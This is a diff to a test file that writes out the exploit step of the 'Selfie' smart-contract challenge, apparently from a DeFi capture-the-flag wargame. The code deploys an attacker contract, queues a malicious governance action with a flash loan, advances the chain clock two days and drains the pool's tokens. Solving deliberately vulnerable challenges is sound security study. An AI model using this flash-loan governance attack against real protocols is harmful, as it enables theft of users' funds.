@@ -30,7 +30,17 @@ describe('[Challenge] Selfie', function () {
     });
 
     it('Exploit', async function () {
-        /** CODE YOUR EXPLOIT HERE */
+        const SelfieAttackerFactory = await ethers.getContractFactory('SelfieAttacker', attacker);
+        const attackerContract = await SelfieAttackerFactory.deploy();
+
+        // Queue the malicious action
+        await attackerContract.loanAndQueueMaliciousAction();
+
+        // Wait 2 days
+        await ethers.provider.send("evm_increaseTime", [2 * 24 * 60 * 60]);
+
+        // Get all the tokens from the pool
+        await attackerContract.executeMaliciousAction();
     });
 
     after(async function () {
